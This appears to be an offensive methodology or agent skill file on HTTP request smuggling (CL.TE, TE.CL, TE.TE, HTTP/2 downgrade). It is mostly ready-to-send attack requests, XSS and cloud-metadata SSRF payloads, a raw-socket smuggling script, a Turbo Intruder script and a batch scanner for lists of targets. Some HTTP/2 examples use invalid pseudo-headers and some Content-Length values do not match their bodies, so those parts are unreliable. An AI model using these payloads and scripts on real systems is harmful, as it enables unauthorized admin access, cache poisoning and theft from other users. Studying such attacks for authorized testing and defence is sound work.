---
name: smuggling
description: ULTIMATE HTTP Request Smuggling methodology — CL.TE, TE.CL, TE.TE, H2 downgrade, WAF bypass via desync.
---

# HTTP Request Smuggling — Complete Methodology

## Smuggling Fundamentals

HTTP Request Smuggling exploits discrepancies in how front-end (proxy/WAF/load balancer) and back-end servers parse HTTP requests. The core issue: **two parsers interpret the same byte stream differently**, allowing an attacker to "smuggle" a request that the front-end sees as one request but the back-end sees as two (or vice versa).

### Parser Discrepancy Classes

| Class | Front-end sees | Back-end sees | Root cause |
|-------|----------------|---------------|------------|
| **CL.TE** | Content-Length | Transfer-Encoding: chunked | Front-end uses CL, back-end uses TE |
| **TE.CL** | Transfer-Encoding: chunked | Content-Length | Front-end uses TE, back-end uses CL |
| **TE.TE** | Transfer-Encoding (obfuscated) | Transfer-Encoding: chunked | Both use TE but one ignores malformed header |
| **H2.CL / H2.TE** | HTTP/2 pseudo-headers | HTTP/1.1 CL or TE | H2 → H1 downgrade loses framing |

---

## CL.TE Exploitation (Classic)

**Scenario**: Front-end uses `Content-Length`, back-end honors `Transfer-Encoding: chunked`.

### Detection Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 67
Transfer-Encoding: chunked

0

SMUGGLED
```

**How it works**:
1. Front-end reads `Content-Length: 67` → consumes exactly 67 bytes → sees request end
2. Back-end sees `Transfer-Encoding: chunked` → parses chunked body:
   - `0\r\n\r\n` = end of chunked body
   - `SMUGGLED` = start of **next** request (smuggled prefix)

### Exploit: Request Smuggling to Poison Cache / Hit Admin Panel

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 98
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Foo: bar
```

**Result**: Back-end processes `GET /admin` as a new request. If front-end caches the response to the original `POST /`, the poisoned cache serves admin panel to other users.

### CL.TE Variations

**With body in smuggled request**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 112
Transfer-Encoding: chunked

0

POST /api/user/role HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 27

{"role":"admin","user":"victim"}
```

**Multiple smuggled requests** (pipeline):
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Smuggled: 1

GET /api/users HTTP/1.1
Host: target.com
X-Smuggled: 2
```

---

## TE.CL Exploitation

**Scenario**: Front-end uses `Transfer-Encoding: chunked`, back-end uses `Content-Length`.

### Detection Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: target.com
Foo: bar

0

```

**How it works**:
1. Front-end parses chunked: `5c` (92 bytes) → reads 92 bytes → sees `0` chunk → request ends
2. Back-end reads `Content-Length: 4` → consumes only `5c\r\n` → `GET /admin...` becomes **next** request

### Exploit: Bypass Front-end Auth

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

56
GET /admin/delete-user?id=victim HTTP/1.1
Host: target.com
Foo: bar

0
```

**Critical**: The smuggled request must be **complete** including its own `Content-Length` or `Transfer-Encoding` so back-end parses it correctly.

### TE.CL with Chunked Smuggled Request

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

4d
POST /api/action HTTP/1.1
Host: target.com
Content-Length: 18
Transfer-Encoding: chunked

0

0
```

---

## TE.TE Obfuscation (Header Smuggling)

**Scenario**: Both servers support `Transfer-Encoding` but one ignores malformed values.

### Obfuscation Techniques

| Technique | Header Example | Works when |
|-----------|----------------|------------|
| **Space prefix** | `Transfer-Encoding : chunked` | Back-end trims, front-end doesn't |
| **Tab prefix** | `Transfer-Encoding:\tchunked` | Same as above |
| **Case variation** | `transfer-encoding: chunked` | Case-sensitive parser |
| **Duplicate header** | `Transfer-Encoding: x\r\nTransfer-Encoding: chunked` | First-wins vs last-wins |
| **Invalid value** | `Transfer-Encoding: xchunked` | One parser rejects, other falls back |
| **Header folding** | `Transfer-Encoding: chunked\r\n chunked` | RFC 7230 folding support |
| **Unicode normalization** | `Transfer-Encoding: chunked​` (zero-width space) | Unicode-aware vs byte parser |

### TE.TE Detection Payload

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Content-Length: 4

5c
G
ET / HTTP/1.1
Host: target.com

0

```

**Mechanism**: Front-end sees `xchunked` (invalid) → falls back to `Content-Length: 4` → reads `5c\r\n`. Back-end sees valid `chunked` (last header wins) → parses chunked body → `GET /` smuggled.

### Advanced: Mutant TE Header

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked, x
Content-Length: 4

5c
GET /admin HTTP/1.1
Host: target.com

0
```

---

## H2 Downgrade Smuggling (HTTP/2 → HTTP/1.1)

**Scenario**: Front-end speaks HTTP/2, back-end speaks HTTP/1.1. H2 frames are translated to H1, losing framing guarantees.

### H2.CL (H2 request → H1 with Content-Length)

**Attack**: Send H2 request with smuggled body that becomes ambiguous when translated.

```bash
# Using h2c (HTTP/2 cleartext) or h2 (TLS)
# Smuggle via pseudo-headers + body manipulation
```

**Payload structure** (conceptual - actual via tool):
```
:method = POST
:path = /
:authority = target.com
content-length = 13
:smuggled = GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
```

When downgraded to H1:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
:smuggled = GET /admin HTTP/1.1
Host: target.com
```

If back-end ignores unknown header `:smuggled` but parses `Content-Length` → sees body as `GET /admin...` → new request.

### H2.TE (H2 request → H1 with Transfer-Encoding)

```http
# H2 request with TE header (not standard in H2)
:method = POST
:path = /
:authority = target.com
transfer-encoding = chunked
:body = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
```

Downgraded to:
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### Request Smuggling via Header Injection in H2

```bash
# Inject \r\n in header values to split H1 request
:method = POST
:path = /
:authority = target.com
x-forwarded-for = 1.2.3.4\r\nTransfer-Encoding: chunked\r\nX-Injected: test
content-length = 13

0\r\n\r\nGET /admin
```

---

## Request Splitting: Prefix / Suffix Smuggling

### Prefix Smuggling (Prepend to Victim's Request)

```http
# Attacker sends:
POST / HTTP/1.1
Host: target.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: 
```

**Victim's request gets appended**:
```
GET /admin HTTP/1.1
Host: target.com
X-Ignore: GET /victim-page HTTP/1.1
Host: target.com
Cookie: victim-session
```

Attacker controls `X-Ignore:` prefix → victim's `GET /victim-page` becomes header value → attacker's `GET /admin` executes.

### Suffix Smuggling (Append After Victim's Request)

```http
# Attacker sends first (smuggles suffix):
POST / HTTP/1.1
Host: target.com
Content-Length: 45
Transfer-Encoding: chunked

0

POST /api/action HTTP/1.1
Host: target.com
Content-Length: 18
Content-Type: application/json

{"action":"delete"}
```

**Victim's request comes after** → attacker's smuggled request executes first, then victim's.

### Combined: Request Splitting for Cache Poisoning

```bash
# 1. Smuggle prefix that makes victim's request look like:
GET /static.js HTTP/1.1
Host: target.com
X-Smuggled: GET /admin HTTP/1.1
Host: target.com
```

If front-end caches based on `Host` + path → cache key = `target.com/static.js` but response is admin panel.

---

## WAF Bypass via Smuggling

**Core concept**: Smuggle malicious payload **past WAF** to back-end. WAF sees benign request; back-end sees attack.

### Technique 1: Smuggle SQLi/XSS Past WAF

```http
# WAF sees: POST /search with benign body
# Back-end sees: POST /search + smuggled GET /admin?x=<script>alert(1)</script>

POST /search HTTP/1.1
Host: target.com
Content-Length: 89
Transfer-Encoding: chunked

0

GET /admin?x=<script>alert(1)</script> HTTP/1.1
Host: target.com
X-Foo: bar
```

### Technique 2: Smuggle to Internal Endpoint (SSRF via Smuggling)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 105
Transfer-Encoding: chunked

0

GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: 169.254.169.254
X-Forwarded-For: 127.0.0.1
```

### Technique 3: Bypass WAF Rules on Specific Parameters

```http
# WAF inspects 'q' parameter in POST body
# Smuggle request where 'q' is in smuggled portion
POST /search HTTP/1.1
Host: target.com
Content-Length: 78
Transfer-Encoding: chunked

0

GET /search?q=<svg/onload=alert(1)> HTTP/1.1
Host: target.com
X: Y
```

### Technique 4: Chunked Encoding Obfuscation for WAF Evasion

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

5c
GET /admin HTTP/1.1
H
ost: target.com

0
```

WAF may not reassemble chunked body correctly → misses `Host:` header split.

---

## Tool Methodology

### smuggler.py (Classic, Reliable)

```bash
# Install
git clone https://github.com/anshumanbh/smuggler ./tools/smuggler
cd ./tools/smuggler && pip install -r requirements.txt

# CL.TE detection
python3 smuggler.py -u https://target.com -m CL.TE

# TE.CL detection
python3 smuggler.py -u https://target.com -m TE.CL

# TE.TE detection
python3 smuggler.py -u https://target.com -m TE.TE

# H2 downgrade
python3 smuggler.py -u https://target.com -m H2.CL --h2

# Custom payload
python3 smuggler.py -u https://target.com -p custom_payload.txt

# Exploit mode (cache poisoning)
python3 smuggler.py -u https://target.com -m CL.TE --exploit --exploit-path /admin
```

### http-smg.py (Advanced, Research-Grade)

```bash
# Install
git clone https://github.com/Regnos/http-smg ./tools/http-smg
cd ./tools/http-smg && pip install -r requirements.txt

# Full scan all techniques
python3 http-smg.py -u https://target.com --all

# Specific technique with timing
python3 http-smg.py -u https://target.com --cl-te --timing

# Request splitting test
python3 http-smg.py -u https://target.com --split --prefix-path /admin

# WAF bypass test
python3 http-smg.py -u https://target.com --cl-te --payload "<script>alert(1)</script>"

# H2 downgrade
python3 http-smg.py -u https://target.com --h2-cl --h2
```

### Burp Suite: HTTP Smuggler Extension

```bash
# Install via BApp Store or:
# 1. Download HTTP Smuggler.jar
# 2. Extender → Add → HTTP Smuggler.jar

# Usage in Burp:
# 1. Send request to HTTP Smuggler tab
# 2. Choose technique: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE
# 3. Configure smuggled request (prefix/suffix)
# 4. Click "Smuggle" → analyzes responses for desync
# 5. Use "Auto-smuggle" for automated detection
```

### Turbo Intruder (For High-Speed Smuggling)

```python
# Turbo Intruder script for CL.TE
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)
    
    # Smuggled prefix
    smuggled = "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
    cl = len(smuggled) + 5  # "0\r\n\r\n" + smuggled
    
    attack = f"""POST / HTTP/1.1\r
Host: target.com\r
Content-Length: {cl}\r
Transfer-Encoding: chunked\r
\r
0\r
\r
{smuggled}"""
    
    engine.queue(attack)

def handleResponse(req, interesting):
    if req.status != 404 and "admin" in req.response:
        table.add(req)
```

### Custom Smuggling Script (Python Raw Sockets)

```python
#!/usr/bin/env python3
# smuggle_raw.py - Raw socket smuggling for precise control
import socket, ssl, sys, time

def smuggle_cl_te(host, port=443, path="/", smuggled_request=""):
    context = ssl.create_default_context()
    sock = context.wrap_socket(socket.socket(), server_hostname=host)
    sock.connect((host, port))
    
    # Build CL.TE payload
    smuggled_bytes = smuggled_request.encode()
    cl = len(b"0\r\n\r\n") + len(smuggled_bytes)
    
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n\r\n"
    ).encode() + smuggled_bytes
    
    sock.send(payload)
    response = b""
    sock.settimeout(5)
    try:
        while True:
            data = sock.recv(4096)
            if not data: break
            response += data
    except socket.timeout:
        pass
    sock.close()
    return response.decode(errors='ignore')

# Usage
if __name__ == "__main__":
    host = sys.argv[1]
    smuggled = "GET /admin HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
    print(smuggle_cl_te(host, smuggled_request=smuggled))
```

---

## Detection Techniques

### 1. Timing-Based Detection

```bash
# Send smuggled request that triggers slow operation
# Measure response time difference

# Normal request timing
curl -w "%{time_total}\n" -o /dev/null -s https://target.com/

# Smuggled request with sleep (if back-end processes it)
# CL.TE with smuggled: GET /?sleep=5
python3 -c "
import requests, time
start = time.time()
r = requests.post('https://target.com/', 
    headers={'Content-Length': '50', 'Transfer-Encoding': 'chunked'},
    data='0\r\n\r\nGET /?sleep=5 HTTP/1.1\r\nHost: target.com\r\n\r\n',
    verify=False)
print(f'Time: {time.time() - start:.2f}s')
"
```

**Interpretation**: If response time ≈ 5s → smuggling worked (back-end processed sleep).

### 2. Response-Based Detection (Differential Analysis)

```bash
# Send two requests: one with smuggled prefix, one without
# Compare responses for anomalies

# Baseline
curl -s https://target.com/ -o baseline.txt

# Smuggled
curl -s -X POST https://target.com/ \
  -H "Content-Length: 45" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' \
  -o smuggled.txt

# Diff
diff -u baseline.txt smuggled.txt
```

**Indicators of success**:
- Different status code (200 vs 404 vs 500)
- Different response length
- Admin panel content in response
- Set-Cookie headers from smuggled request
- Error messages revealing back-end processing

### 3. Cache Poisoning Detection

```bash
# 1. Smuggle request that poisons cache
# 2. Request same resource normally
# 3. Check if poisoned response served

# Step 1: Poison
python3 smuggler.py -u https://target.com -m CL.TE --exploit --exploit-path /static.js

# Step 2: Request poisoned resource
curl -s https://target.com/static.js -H "Host: target.com" | head -20

# Step 3: Check for admin content in static.js response
```

### 4. Connection-State Detection (Request Splitting)

```bash
# Send smuggled request, then send victim-like request on same connection
# Check if victim request gets smuggled prefix

python3 -c "
import socket, ssl
ctx = ssl.create_default_context()
s = ctx.wrap_socket(socket.socket(), server_hostname='target.com')
s.connect(('target.com', 443))

# Request 1: Smuggle prefix
s.send(b'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 45\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX-Ignore: ')

# Request 2: Victim request (on same connection)
s.send(b'GET /victim HTTP/1.1\r\nHost: target.com\r\n\r\n')

# Read responses
print(s.recv(8192).decode())
print(s.recv(8192).decode())
s.close()
"
```

---

## Evidence Collection

### Raw HTTP/1.1 Request Format (Burp Repeater Ready)

**CL.TE Detection Request**:
```
POST / HTTP/1.1
Host: target.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Foo: bar
```

**CL.TE Exploit Request (Cache Poisoning)**:
```
POST / HTTP/1.1
Host: target.com
Content-Length: 98
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Cache-Control: no-cache
X-Forwarded-For: 127.0.0.1
```

**TE.CL Detection Request**:
```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: target.com
Foo: bar

0
```

**TE.TE Obfuscation Request**:
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Content-Length: 4

5c
GET /admin HTTP/1.1
Host: target.com

0
```

### Raw HTTP/2 Request Format (for h2c/h2 tools)

**H2.CL Smuggling (pseudo-headers)**:
```
:method: POST
:path: /
:authority: target.com
:scheme: https
content-length: 55
x-smuggled: GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n
```

**H2.TE Smuggling**:
```
:method: POST
:path: /
:authority: target.com
:scheme: https
transfer-encoding: chunked
:body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
```

### Evidence Package Structure

```
exploit/F001-smuggling/
├── finding-summary.md
├── steps-to-reproduce.md
├── request-cl-te-detection.txt
├── response-cl-te-detection.txt
├── request-cl-te-exploit.txt
├── response-cl-te-exploit.txt
├── request-te-cl-detection.txt
├── response-te-cl-detection.txt
├── request-te-te-obfuscation.txt
├── response-te-te-obfuscation.txt
├── request-h2-downgrade.txt
├── response-h2-downgrade.txt
├── timing-analysis.md
├── cache-poisoning-proof.txt
└── screenshots/
    ├── burp-smuggler-tab.png
    ├── cache-poisoned-response.png
    └── admin-panel-access.png
```

### Finding Summary Template

```markdown
# F001: HTTP Request Smuggling (CL.TE) → Cache Poisoning → Admin Panel Access

**Severity**: Critical
**Type**: HTTP Request Smuggling (CL.TE) → Web Cache Poisoning → Unauthorized Admin Access
**Target**: https://target.com/
**Impact**: Full admin panel access for any user via poisoned cache

## Vulnerability Details
- **Front-end**: Cloudflare (uses Content-Length)
- **Back-end**: nginx + Node.js (honors Transfer-Encoding: chunked)
- **Technique**: CL.TE desync with request splitting

## Proof of Concept
1. Send CL.TE smuggled request with `GET /admin` prefix
2. Front-end caches response to `POST /` 
3. Victim requests `/` → receives cached admin panel
4. Attacker accesses admin panel via poisoned cache

## Evidence
- Raw request/response pairs in request-*.txt, response-*.txt
- Timing analysis shows 5s delay when smuggled sleep payload used
- Cache poisoning confirmed: admin panel served on static resource
- Screenshots show admin panel access without authentication
```

---

## Quick Reference: Smuggling Decision Tree

```
START: Can I send raw HTTP/1.1?
  │
  ├─ YES → Test CL.TE first (most common)
  │         │
  │         ├─ Works? → EXPLOIT: Cache poison, request split, WAF bypass
  │         └─ Fails? → Test TE.CL
  │                    │
  │                    ├─ Works? → EXPLOIT
  │                    └─ Fails? → Test TE.TE (obfuscation)
  │                               │
  │                               ├─ Works? → EXPLOIT
  │                               └─ Fails? → Test H2 downgrade
  │
  └─ NO (only H2) → Test H2.CL / H2.TE via h2c or TLS
                     │
                     ├─ Works? → EXPLOIT via H2→H1 desync
                     └─ Fails? → Check for HTTP/2-only back-end (no H1)
```

---

## Common Pitfalls & Fixes

| Issue | Cause | Fix |
|-------|-------|-----|
| **400 Bad Request** | Malformed chunked encoding | Validate chunk sizes: hex + `\r\n` + data + `\r\n` |
| **411 Length Required** | Back-end requires CL | Add `Content-Length` to smuggled request |
| **Connection closed** | Front-end detects desync | Reduce smuggled size, add `Connection: keep-alive` |
| **No differential response** | Smuggled request not processed | Verify back-end actually receives smuggled bytes (timing test) |
| **WAF blocks** | WAF inspects body | Use TE.TE obfuscation or H2 downgrade |
| **Cache not poisoned** | Cache key mismatch | Match exact cache key: Host, path, headers, cookies |

---

## Automation: Batch Smuggling Scan

```bash
#!/bin/bash
# scan-smuggling.sh - Batch scan multiple targets

TARGETS_FILE="$1"
OUTDIR="smuggling-scan-$(date +%Y%m%d)"

mkdir -p "$OUTDIR"

while read target; do
    echo "=== Scanning $target ==="
    
    # CL.TE
    python3 ./tools/smuggler/smuggler.py -u "$target" -m CL.TE \
        -o "$OUTDIR/${target//\//_}-cl-te.json" 2>&1 | tee "$OUTDIR/${target//\//_}-cl-te.log"
    
    # TE.CL
    python3 ./tools/smuggler/smuggler.py -u "$target" -m TE.CL \
        -o "$OUTDIR/${target//\//_}-te-cl.json" 2>&1 | tee "$OUTDIR/${target//\//_}-te-cl.log"
    
    # TE.TE
    python3 ./tools/smuggler/smuggler.py -u "$target" -m TE.TE \
        -o "$OUTDIR/${target//\//_}-te-te.json" 2>&1 | tee "$OUTDIR/${target//\//_}-te-te.log"
    
    # H2.CL (if HTTPS)
    if [[ "$target" == https://* ]]; then
        python3 ./tools/smuggler/smuggler.py -u "$target" -m H2.CL --h2 \
            -o "$OUTDIR/${target//\//_}-h2-cl.json" 2>&1 | tee "$OUTDIR/${target//\//_}-h2-cl.log"
    fi
    
    sleep 2  # Rate limiting
done < "$TARGETS_FILE"

echo "Scan complete. Results in $OUTDIR/"
```

---

## Reporting Checklist

Before submitting smuggling finding:

- [ ] **Reproducible** from fresh connection (no prior state)
- [ ] **Technique identified** (CL.TE / TE.CL / TE.TE / H2.CL / H2.TE)
- [ ] **Front-end & back-end identified** (Cloudflare → nginx, ALB → Apache, etc.)
- [ ] **Impact demonstrated**: cache poisoning, request splitting, WAF bypass, SSRF, admin access
- [ ] **Raw requests captured** (HTTP/1.1 and/or HTTP/2 format)
- [ ] **Response differential shown** (baseline vs smuggled)
- [ ] **Timing evidence** if applicable
- [ ] **Cache poisoning confirmed** with victim simulation
- [ ] **Steps are copy-paste reproducible** in Burp Repeater
- [ ] **Severity justified**: Critical (admin access, SSRF to metadata) / High (cache poison, auth bypass) / Medium (info leak via splitting)

---

## References & Further Research

- **Original**: "HTTP Request Smuggling" - Kettle (PortSwigger, 2019)
- **H2 Smuggling**: "HTTP/2 Request Smuggling" - Kettle (2020)
- **TE.TE**: "HTTP Request Smuggling: New Variants" - Kettle (2021)
- **Tools**: smuggler.py, http-smg.py, HTTP Smuggler (Burp), Turbo Intruder
- **Advanced**: "Desync Attacks: Request Smuggling Revisited" - Black Hat 2023
